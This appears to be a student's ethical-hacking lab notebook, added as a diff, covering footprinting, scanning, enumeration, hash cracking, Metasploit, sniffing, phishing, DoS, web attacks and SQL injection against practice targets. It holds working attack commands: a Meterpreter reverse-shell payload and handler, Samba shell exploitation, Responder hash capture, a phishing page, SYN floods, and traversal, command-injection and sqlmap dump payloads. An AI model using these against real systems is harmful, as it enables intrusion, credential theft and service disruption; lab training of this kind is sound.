@@ -1,0 +1,577 @@
+WINDOWS 
+username : udit
+password : qwerty
+
+Turn off firewalls whenever use windows machine 
+
+METASPLOITABLE : 
+username : msfadmin
+password : msfadmin
+
+#Practical 2
+
+a. Perform Footprinting through Search Engines
+“google search operators” site:google.com
+allinurl:google search operators
+inurl:google search operators
+Cybersecurity filetype:pdf
+define:cybersecurity
+intitle:login site:eccouncil.org
+
+b. Find the Company's Domains and Sub-domains using Netfcraft
+Navigate to https://sitereport.netcraft.com/ and enter https://certifiedhacker.com/ and click on LookUp
+Now we got the site report, click on cetifiedhacker.com beside of domain to get the sub domains
+of the target
+
+c. Gather personal information from various social networking sites using Sherlock
+sherlock user123
+
+d. Gather info about target website using Ping command line utility. Perform Email Footprinting
+IN WINDOWS
+ping certifiedhacker.com
+
+
+e. Mirroring website using HTTrack Web Site Copier
+Download HTTrack on Linux:
+sudo apt-get install webhttrack
+After installation open terminal and enter webhttrack command to start webhttrack
+A web interface will be opened
+Click on next to proceed
+Project Name : Website mirror
+Enter the Project title and path to save the mirror website and click on next
+
+f. Perform Whois Footprinting
+http://whois.domaintools.com
+
+g. Perform DNS Footprinting
+https://www.kloth.net/services/nslookup.php
+Domain : certifiedhacker.com
+Server : localhost
+Query : CNAME
+
+h. Perform reverse DNS lookup using Reverse IP domain check and DNSRecon
+navigate to https://www.yougetsignal.com/ and select Reverse IP Domain check and enter www.certifiedhacker.com
+In Kali Linux and open terminal and type dnsrecon -r 162.241.216.0-162.241.216.255
+
+i. Perform Network Footprinting
+https://www.arin.net/ enter 162.241.216.11
+
+j. Perform network tracerouting in Windows and Linux machines
+IN WINDOWS CMD
+tracert –h 5 www.certifiedhacker.com
+
+IN KALI
+traceroute -m 5 kali.org
+
+k. Footprinting a target using Recon-ng
+recon-ng
+marketplace install all
+modules search
+workspaces create mscybersecurity
+workspaces list
+db insert domains
+certifiedhacker.com
+notes skip and enter
+modules load recon/domains-hosts/brute_hosts
+run
+back
+modules load recon/hosts-hosts/reverse_resolve
+run
+show hosts
+back
+modules load reporting/html
+options set CREATOR udit
+options set CUSTOMER IT
+options set FILENAME /home/kali/Desktop/results.html
+
+l. Footprinting a target using Maltego
+On Kali Linux Start the Maltego and drag and drop the website entity from the left pane of the Entity Palette
+Right click on website and click To Domain [DNS] to get the domains of the websites
+Right-click the certifiedhacker.com entity and select All Transforms ---> To DNS Name [Using Name Schema diction...]
+Right-click the certifiedhacker.com entity and select All Transforms --> To DNS Name SOA (Start of Authority)
+Right-click the certifiedhacker.com and select All Transform --> To Entities from WHOIS [IBM Watson].
+Right-click the website and select All Transforms --> To IP Address [DNS]
+Right-click the IP address entity and select All Transforms --> To location [city, country]
+
+m. Footprinting a target using OSINT Framework
+https://osintframework.com/
+
+#Practical 3
+a. UDP and TCP Packet Crafting Techniques using hping3
+
+TCP SYN scan
+sudo hping3 -S -p 80 <target_ip>
+
+ACK scan
+sudo hping3 -A -p 80 <target_ip>
+
+Xmas scan (FIN + URG + PSH)
+sudo hping3 -FUP -p 80 <target_ip> -c 5
+
+Basic UDP Probe 
+sudo hping3 --udp -p 53 <target_ip> -c 5
+
+Source Port Spoofing 
+sudo hping3 --udp -s 53 -p 123 <target_ip> -c 3
+
+Fragmented UDP packets
+sudo hping3 --udp -p 161 -f <target_ip> -c 3
+
+Mixing UDP with other flags
+sudo hping3 --udp -p 161 --rr <target_ip> -c 2
+
+b.  Identify Target System's OS with TTL (Time-to-Live) and TCP Windows Sizes using 
+Wireshark 
+
+Common default TTL values used by OS vendors 
+TTL Value (Default) Likely OS Family 
+64 Linux / Unix / macOS 
+128 Windows (all versions) 
+255 Cisco / Network devices 
+
+
+Common default TCP Window Sizes used by OS vendors 
+TCP Window Size Likely OS Version 
+8192 Older Windows (Win XP) 
+65535 Windows 7/10, modern Windows 
+5840 Linux (older kernels) 
+29200 / 64240 Linux (modern kernels) 
+4128 Cisco IOS devices 
+
+IN KALI :
+nmap -sT 162.241.216.11
+
+IN WINDOWS :
+ping 162.241.216.11
+
+c. Basic Network Troubleshooting using MegaPing (Windows) 
+Chhose any options from left pane (System info , Ping, Host Monitor,etc)
+
+d. Understanding the Basics of Network Scanning using Nmap
+
+Nmap scan to check whether the host is up or not 
+nmap -sn <target_ip>
+TCP scan
+nmap -sT <target_ip>
+
+Stealth Scan
+nmap -sS -v <target_ip>
+
+Xmas Scan
+nmap -sX <target_ip>
+
+ACK flag probe
+nmap -sA <target_ip>
+
+UDP Scan
+nmap -sU -v <target_ip> -T4
+
+IDLE/IPID Header Scan
+nmap -sI 192.168.100.11 <target_ip> 
+
+SCTP INIT Scan
+nmap -sY -v <target_ip>
+
+SCTP COOKIE ECHO scan
+nmap -sZ <target_ip>
+
+#Practical 4
+a. Enumeration using Nmap 
+
+ls /usr/share/nmap/scripts | grep dns
+nmap -sV certifiedhacker.com
+nmap --script 
+#<53 tcp domain>
+nmap -T4 -p 53 --script dns-brute certifiedhacker.com 
+
+nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='certifiedhacker.com'" 
+
+b. SNMP Enumeration
+WIndows + Kali
+IN WINDOWS
+
+Windows -> search windows features or turn -> search SNMP -> turn ON -> win+R type services.msc -> search SNMP service -> right click -> properties -> Agent -> Tick all checkboxes -> apply ->security -> Add 2 communities 'Public' & 'private' -> select "Accept SNMP packets from these HOSTS -> Add -> give IP of Kali machine -> Restart if needed
+
+IN KALI 
+snmp-check <windows_IP>
+
+c. NetBIOS Enumeration using NSE Scripts 
+WINDOWS + KALI
+Turn of all Firewalls only and nothing
+
+ls /usr/share/nmap/scripts | grep nbstat
+nbstat.nse
+nmap –sV --script nbstat.nse <Windows_IP>
+
+nmap -sU 
+#<139 tcp>
+nmap –sU –p 153 –script nbstat.nse <WIndows IP>
+
+d. SNMP Enumeration using Metasploit 
+start windows 7 
+Turn off firewalls 
+Windows -> search windows features or turn -> search SNMP -> turn ON -> win+R type services.msc -> search SNMP service -> right click -> properties -> Agent -> Tick all checkboxes -> apply ->security -> Add 2 communities 'Public' & 'private' -> select "Accept SNMP packets from these HOSTS -> Add -> give IP of Kali machine -> Restart if needed
+
+In KALI
+msfconsole
+use auxiliary/scanner/snmp/snmp_enum
+show options
+set rhosts <windows_IP>
+exploit 
+
+e. Advanced IP Scanner
+Open the Advanced IP Scanner and enter the IP range and click tbe scan button  
+• Right Click the target machine and click on tools, here we have ping, traceroute and 
+other options. 
+• Ping and traceroute using Advanced IP Scanner 
+• Now to access the target machine remotely right and click explore to view its file 
+
+#Practical 5
+Aim: Vulnerability Analysis 
+
+a. Nessus 
+Kali -> Firefox -> tenable -> download tenable nessus package file. -> Linux Debian amd64
+
+IN TERMINAL
+cd Downloads
+ls
+sudo dpkg -i ./Nessus
+/bin/systemctl start  nessusd.service
+
+Firefox -> kali:8834 
+Policies -> create new policy -> Advanced Scan
+Settings -> Discovery Ports -> Port Scanning -> tick TCP ports
+Credentials -> SSH on -> Authentication method (password) -> username: msfadmin password : msfadmin -> save
+folders -> Myscan -> +newscan -> user defined -> testscan -> metasploitable IP 
+start metasploitable machine and enter its ip in target IP -> Launch 
+
+in terminal 
+/bin/systemctl stop nessusd.service 
+
+b. Nikto 
+nikto -h <target_IP>
+
+c. Nmap
+nmap --script vuln <target_IP> -T5
+
+d. searchsploit
+searchsploit vsftpd 2.3.4
+
+searchsploit afd windows local
+
+searchsploit Linux reverse password
+
+#Practical 6
+
+sudo su
+responder -I etho
+
+IN WINDOWS 
+win+R -> \\<kali_IP>
+Now GO to Kali,you will get the NTLM hash for the machine, copy paste it into a text 
+file and save the file 
+ mousepad hash_file.txt
+• To crack the Hash we will use John-The Ripper tool, by firing command john 
+<hash_file.txt>
+
+b. Rainbow table crack using Winrtgen 
+
+Go to windows machine and start the winrtgen to generate a rainbow table , select the 
+hash MD5 and MAX Length 3 Chain len 1000 and chain count 1000 charset loweralpha and click OK 
+Now select the MD5 file and click on start
+.rt file will be generated, now we will use this file to crack the hash  of  target machine 
+IN KALI
+rtsort /usr/share/rainbowcrack
+echo -n "qwe" | md5sum
+
+rcrack /usr/share/rainbowcrack -h <hash_value from previous output>
+
+OR 
+
+IN KALI ONLY 
+rtgen 
+rtgen md5 loweralpha 1 4 0 1000 1000 0
+rtsort /usr/share/rainbowcrack
+echo -n "qwe" | md5sum
+rcrack /usr/share/rainbowcrack -h <hash_value from previous output>
+
+c. Hash dump with Pwdump7 and crack with Ophcrack
+download pwdump7 
+run cmd ad administrator 
+Download the pwdump7 exe and execute in windows using command prompt, it will fetch 
+and display the password hashes. 
+
+OPHcrack
+
+d. Hiding file in NTFS stream
+
+click on C drive  -> Properties
+C -> create New Folder - > name it as "thanos"
+C:\Windows\System32, copy calc.exe, and paste it to the C:\thanos
+CMD in RUN AS ADMINISTRATOR
+Now open command prompt in thanos folder and create a readme.txt using command notepad 
+readme.txt, then type dir and press Enter. This action lists all the files present in the directory, along with their file sizes. Note the file size of readme.txt.  
+Now, type type c:\thanos\calc.exe > c:\thanos\readme.txt:calc.exe and press Enter. This command will hide calc.exe inside the readme.txt, now type dir and press Enter. Note the file size of readme.txt, which should not change 
+Now delete the calc.exe from thanos folder and type mklink backdoor.exe readme.txt:calc.exe and type mklink backdoor.exe readme.txt:calc.exe and execute backdoor.exe, calc will open 
+
+e. Hiding Data Using White Space Steganography 
+search SNOW.exe on google 
+open this site https://darkside.com.au/snow/
+download snwdos32.zip
+
+create notepad type Hello World!, and press Enter; then, long-press the hyphen key 
+to draw a dashed line below the text. Save the file as readme.txt in the folder where 
+SNOW.EXE
+
+in CMD 
+SNOW.EXE -C -m "My Name is Shaikh" -p "passwd" readme.txt readme2.txt
+
+SNOW.EXE -C -p "passwd" readme2.txt
+
+To check the file in the GUI, open the readme2.txt in Notepad, and go to Edit → Select 
+All.
+
+f. Image Steganography using OpenStego and QuickStego 
+
+OpenSTego
+Create a text file of secret message and download a image to hide into it and then give its 
+path, password to encrypt and then click hide to hide the data in the image
+On successful completion the bmp image will be generated 
+• For getting the secret message Go Openstego-> Extract Data and then click extract
+In terminal ls -> cat <filename>
+
+QuickStego
+Open QuickStego and click on Open Image then type the secret message and then hide 
+message-> Save image the image with the secret message will be saved
+For getting the secret message from image just open  the image and click Get Text and 
+secret text will be displayed.
+
+g. Demonstrate how to escalate privileges on a victim machine by exploiting its 
+vulnerabilities (SMB enumeration)
+IN kali (commands only)
+
+nmap -sV <target_IP> -o nmap_full_scan
+msfconsole -q
+cat nmap_full_scan
+#139-netbois-ssnSamba
+search smb_version
+use 0
+show options
+set RHOSTS <target_IP>
+set RPORTS 139
+run 
+#samba 3.0.20 - Debian
+search Samba 3.0.20
+use 0
+show options
+set RHOSTS <target_IP>
+run
+shell 
+whoami
+
+h. Hacking Windows using Metasploit / Meterpreter - Post-Exploitation 
+
+msfvenom -p winodws/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=6767 -f exe > evil.exe
+
+#To send exe file we have to make kali as server
+
+python -m http.server 80
+
+Windows -> browser -> <kali_ip>:80
+
+click on evil.exe -> save 
+
+In Kali 
+msfconsole -q 
+use exploit/multi/handler
+set payload winodws/meterpreter/reverse_tcp
+set LHOST <kali_ip>
+set LPORT 6767
+run
+ 
+execute the evil.exe on windows machine 
+Here we get the meterrpreter session for the windows and now we can do anything with it
+
+
+#Practical 7 
+njRAT skip 
+
+#Practical 8 
+Aim: Sniffing
+
+a. Password Sniffing using Wireshark 
+
+Start wireshark -> Start Capture ->  go to 
+http://testphp.vulnweb.com/login.php and enter the credentials 
+
+b. Detect ARP poisoning using wireshark 
+
+IN WINDOWS
+Open the cain and abel tool and click on configure, now select the interface with the ip of your machine 
+
+wireshark, click on edit-> preferences then expand the protocol and select ARP/RARP and 
+then check the Detect ARP requests and click ok
+
+Now start capturing the packets on Ethernet , double click ARP captured packet 
+click analyze -> export information to see the duplicate The warnings highlighted 
+in yellow indicate that duplicate IP addresses have been detected at one MAC address
+
+c. Cain and Abel – MITM Attack via ARP Poisoning 
+
+Start Windows 7 machine, Kali Linux and Metasploitabe 2. Now go to windows machine 
+and start Cain and Abel and click on Configure from Top Menu Bar, select your IP address 
+one and click OK
+Now click on Start Sniffer button and go to sniffer tab and click on “+” button to add the hosts and check the all test checkbox and click OK
+Now go to APR tab and click on “+” button to add the hosts for ARP Poisoning and select 
+the ip address of Metasploitable 2 and kali Machines 
+Now click on Start APR Poisoning button to start poisoning  
+Click the ARP to change the state from idle to poisoning, Now open acunetix.com login by 
+entering username and password. 
+Now go to passwords tab to get the sniffed password
+
+#Practical 9 
+Aim: Social Engineering 
+
+Open Kali -> Application -> SET
+1
+2
+3
+2
+skip IP 
+enter URL : http://testphp.vulnweb.com/login.php
+
+Now go to http:<IP will be provided in skip IP> the phishing page will appear now enter the crendentials
+
+come to terminal, the credentials will be displayed 
+
+#Practical 10 
+Aim: Denial-of-Service 
+
+a. Perform a SYN Flooding on a Target Host using hping3
+
+nmap -sV <target_IP>
+sudo hping3 -S <target_IP> -a 10.10.1.10 -p 80 –flood 
+Open wireshark, click statistics from menu bar and click IO Graph to view graphical 
+view of captured packets, observe the number of tcp packets 
+
+b. HTTP Flooding Attack using HOIC (High Orbit Ion Cannon)
+
+Start HOIC on Windows Machine and click the + icon button 
+Enter the kali IP and set Power to high and select Generic boost in dropdown 
+click on fire to start DOS attack 
+• Now open the IO Graph in wireshark to see the http captured packets. 
+
+c. Detect DoS attack using KFSensor and analyze the incoming packet dump using 
+Wireshark 
+
+Open kfsensor and start the HOIC Dos attack, as soon as it starts it starts siren we get the attacker logs 
+• Right click on any of attacker log and click on event details to get the important details regarding the target 
+
+#Practical 11 
+Aim: Hacking Web Servers  
+
+a. ID Server - Webserver Foot printing 
+
+• Start the ID Servver on windows machine   
+• Enter the website URL of certifiedhacker.com and click on Query Server to start querying website
+
+b. Uniscan - WebServer Fingerprinting (Kali) 
+
+sudo uniscan -u http://<target_ip>/multillidae/ -q
+
+You can check in browser 
+file://usr/share/uniscan/report/<target_ip>.html
+
+c. Skipfish – WebServer Recon 
+Open Kali terminal
+skipfish -o /home/kali/Documents/udit http://<target_ip>/mutillidae/
+
+You can check in browser
+file://home/kali/Documents/udit/index.html
+
+#Practical 12
+Aim: Hacking Web Apps
+
+a. Perform a Brute-force Attack using Burp Suite 
+in dvwa side panel select Brute Force
+
+In Kali Terminal 
+sudo apt install dvwa
+dvwa-start
+
+Start Burp Suite and capture request that request in which we get username=test&password=test&Login=Login
+
+Now right click the request and click send to Intruder option on list
+
+Now select the username and password field values and click add$  
+
+Now for payloads will be using cluster-bomb attack and the list for username and 
+password and click start attack enter the values in list manually 
+
+• Now focus on length, sort  descending way and we get username as admin and password 
+as password, now try login using this credentials.
+
+b. Exploiting web application vulnerabilities like Cross-Site Scripting, Directory 
+Traversal, File Upload, CSRF, SSRF, Command Injection, etc. 
+
+from side panel select Reflected XSS
+<script>alert("Hello")</script>
+
+Directory Traversal 
+Open the vulnerability:File Inclusion page  
+in url *****page=../../../../../../etc/passwd” for traversal and getting the password files of the system
+
+from side panel choose Upload 
+create text file -> while saving select all files and save as example.php 
+
+CSRF Attack 
+from side pane select CSRF 
+Navigate to change password page and change the password and copy the url 
+
+Command Injection 
+from side pane select Command Execution
+in the input box enter 
+<kali_Ip> | cat /etc/shadow
+
+#Practical 13
+Aim: SQL Injection a. Perform an SQL Injection Attack Against MSSQL to 
+Extract Databases using SQLMap 
+
+in dvwa select SQL injection and anter 1 and Submit and capture the request from burpsuite url which has /dvwa/vulnerabilities/sqli/id=1&Submit=Submit
+
+Now right click the request, and select copy to file option to save the request in file name "dbs" 
+and in kali type  
+sqlmap –r sql --dbs 
+sqlmap –r sql –D dvwa --tables
+sqlmap -r sql -D dvwa -T users --columns 
+sqlmap -r sql -D dvwa -T users -C user,password –dump 
+
+#Practical 14
+Aim:Cryptography
+
+a. Calculate One-way Hashes using Hashcalc
+ 
+Open Hashcalc and enter the text string you want to hash and then click on calculate, it will give the hash values for the selected formats. 
+
+b. Calculate MD5 Hashes using MD5 Calculator 
+
+search on google for any md5 hash calculator and input the string you want to hash, it will calculate and give the hash of it.
+
+c. Perform File Encryption using Advanced Encryption Package 
+
+Open Advanced Encryption Package, and navigate to file which need be encrypted, then give password and click on Encrypt Now button
+aep encrypted file will be generated. 
+Now for decryption, select aep file and enter password and click, on decrypt the file will be decrypted… 
+
+d. Encrypt and Decrypt messages using BCText Encoder 
+
+Open the BCTextEncoder and enter the secret message, and click on encode then give password, it give the encoded text for secret message 
+Now decoding, enter the coded text in decode text box and click on decode button and enter password, it will give the decoded text 
+
+E . Perform Encryption and Decryption using Cryptool 
+
+Open the cryptool and enter the secret message to encrypt it, then click on encrypt/Decrypt select the encryption algo  
+
+Click encrypt it will give the encrypted text 
+ 
+Now decrypt select the encrypted text window and select decrypt then give the key and click decrypt 
